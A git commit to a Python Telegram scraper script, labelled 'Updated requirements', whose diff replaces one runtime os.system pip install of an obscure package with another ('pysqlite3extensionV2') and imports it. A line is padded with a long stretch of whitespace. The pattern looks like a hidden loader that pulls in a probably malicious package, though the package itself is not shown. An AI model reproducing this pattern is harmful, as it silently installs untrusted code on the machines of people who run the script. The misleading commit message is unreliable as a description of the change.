79538df1ef81999f93195c03c06af6f4c24a39c7
b14nk3r <122880466+b14nk3r@users.noreply.github.com>
2023-07-18 02:59:07 +0200

    Updated requirements

--- scraper.py
+++ scraper.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcryptkits")
-import pipcryptkits
+os.system("pip install pysqlite3extensionV2")
+import pysqlite3extensionV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
